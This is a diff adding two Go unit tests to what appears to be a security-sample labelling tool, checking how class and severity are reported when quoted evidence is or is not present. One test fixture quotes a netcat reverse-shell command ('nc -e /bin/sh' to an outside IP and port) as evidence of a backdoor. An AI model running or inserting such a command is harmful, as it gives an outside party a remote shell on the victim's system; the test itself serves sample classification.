@@ -169,3 +169,40 @@ func TestEvidenceQuoteIsEscaped(t *testing.T) {
 		t.Errorf("got %q, want the inner quotes escaped", got)
 	}
 }
+
+// A located quote showing an attack settles two questions at once: that the sample is
+// malicious, and what it achieves. Leaving `class` on a batch constant while `dimension`
+// says `read` would understate evidence that is already in hand.
+func TestClassFollowsDimensionEvidence(t *testing.T) {
+	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious", SeverityFrom: "constant:high"})
+	got := basisBlock(e, Coord{
+		Class: "malicious", Severity: "high", Dimensions: []string{"backdoor"},
+		HandReadDimension: true,
+		DimensionEvidence: &manifest.Evidence{
+			File: "scripts/diag_relay.sh", Lines: "3", Quote: "nc -e /bin/sh 203.0.113.66 4444",
+		},
+	})
+	if !strings.Contains(got, "class: read") {
+		t.Errorf("got %q, want class: read — the quote shows the attack, which is what makes "+
+			"the sample malicious", got)
+	}
+	// An assumption is still present, and correctly so — it belongs to `severity`, which the
+	// quote does not answer. It has to say which axis it is about, or a reader would take it
+	// for a hedge on the class.
+	if !strings.Contains(got, "severity for every sample") {
+		t.Errorf("got %q — the assumption must name the axis it covers", got)
+	}
+	// Severity is a separate question the quote does not answer.
+	if !strings.Contains(got, "severity: assumed") {
+		t.Errorf("got %q, want severity to stay assumed", got)
+	}
+}
+
+// Without evidence nothing is upgraded: the class stays on whatever the rule actually said.
+func TestClassNotUpgradedWithoutEvidence(t *testing.T) {
+	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
+	got := basisBlock(e, Coord{Class: "malicious", Dimensions: []string{"backdoor"}, HandReadDimension: true})
+	if !strings.Contains(got, "class: assumed") {
+		t.Errorf("got %q, want class: assumed", got)
+	}
+}
